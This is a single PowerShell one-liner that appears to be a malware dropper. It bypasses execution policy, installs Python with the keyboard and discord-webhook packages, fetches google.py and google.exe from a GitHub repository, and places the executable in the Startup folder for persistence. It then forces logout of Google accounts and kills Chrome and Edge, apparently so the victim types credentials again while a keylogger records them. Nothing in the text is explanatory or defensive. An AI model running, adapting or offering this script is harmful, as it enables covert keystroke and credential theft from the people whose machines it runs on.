Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); choco install python -y; pip install keyboard; pip install discord-webhook; cd "C:\ProgramData"; Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/lutfica/main/google.py; cd "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; Start-BitsTransfer https://github.com/2o2ks/lutfica/raw/main/google.exe; $path = "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\google.exe"; start msedge https://accounts.google.com/logout; start chrome https://accounts.google.com/logout; Stop-Process -Name chrome; Stop-Process -Name msedge; Start-Sleep -Seconds 10; exit
